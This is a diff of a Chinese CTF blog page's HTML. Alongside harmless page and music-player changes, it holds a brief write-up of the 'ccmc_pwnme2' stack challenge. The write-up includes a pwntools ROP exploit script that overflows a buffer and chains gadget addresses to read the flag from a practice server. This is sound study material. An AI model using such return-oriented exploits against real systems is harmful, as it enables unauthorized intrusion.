@@ -3,16 +3,6 @@
 <html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
 <![endif]-->
 <!--[if (gte IE 9)|!(IE)]><!-->
-<!--
-***************  *      *     *
-      8          *    *       *
-      8          *  *         *
-      8          **           *
-      8          *  *         *
-      8          *    *       *
-      8          *      *     *
-      8          *        *   ***********    -----Theme By Kieran(http://go.kieran.top)
--->
 <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
 <!--<![endif]-->
 
@@ -55,13 +45,15 @@
   
 
   <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
-<link rel="stylesheet" href="/css/prism.css" type="text/css"></head>
+<link rel="stylesheet" href="/css/prism.css" type="text/css"><link rel="stylesheet" href="/assets/css/APlayer.min.css" class="aplayer-style-marker">
+<script src="/assets/js/APlayer.min.js" class="aplayer-script-marker"></script>
+<script src="/assets/js/Meting.min.js" class="meting-script-marker"></script>
+</head>
 
 <!--
 <body class="post-template">
 -->
 <body id="index" class="lightnav animsition">
-
       <!-- ============================ Off-canvas navigation =========================== -->
 
     <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
@@ -95,7 +87,7 @@
 				    
 				    <li><a href="/categories/HEAP-Unsortedbin/" class="animsition-link">HEAP-Unsortedbin<small>(1)</small></a></li>
 				    
-				    <li><a href="/categories/MESS/" class="animsition-link">MESS<small>(20)</small></a></li>
+				    <li><a href="/categories/MESS/" class="animsition-link">MESS<small>(19)</small></a></li>
 				    
 				    <li><a href="/categories/OTHER-IO-FILE/" class="animsition-link">OTHER - IO FILE<small>(1)</small></a></li>
 				    
@@ -227,9 +219,9 @@
         </div>
         <div class="col-md-8 col-md-offset-2">
       		<p>​    
-			<script>
-				console.error("Error: [hexo-tag-aplayer] Meting support is disabled, cannot resolve the meting tags properly.");
-			</script> </p>
+    <div id="aplayer-inadlMfr" class="aplayer aplayer-tag-marker meting-tag-marker"
+         data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"
+    ></div> </p>
 <h4 id="ccmc-pwnme2"><a href="#ccmc-pwnme2" class="headerlink" title="ccmc_pwnme2"></a>ccmc_pwnme2</h4><p>一道看起来人畜无害的栈题。但是有几个非常奇怪的函数。</p>
 <p>​        所以这是一道相对有些奇怪的rop，控制这三个函数的其中两个的参数为指定字符串，就能较为方便地读取flag。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27653</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./pwnme2&#x27;)</span></span><br><span class="line">pop_edi_ebp_ret= <span class="number">0x0804867f</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x08048680</span></span><br><span class="line"></span><br><span class="line">add_home = <span class="number">0x08048644</span></span><br><span class="line">add_flag = <span class="number">0x08048682</span></span><br><span class="line">exec_string  = <span class="number">0x080485CB</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">112</span>  + p32(add_home) + p32(pop_ebp_ret) + p32(<span class="number">0xDEADBEEF</span>) </span><br><span class="line">payload += p32(add_flag) + p32(pop_edi_ebp_ret) + p32(<span class="number">0xCAFEBABE</span>) + p32(<span class="number">0xABADF00D</span>) </span><br><span class="line">payload += p32(exec_string)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
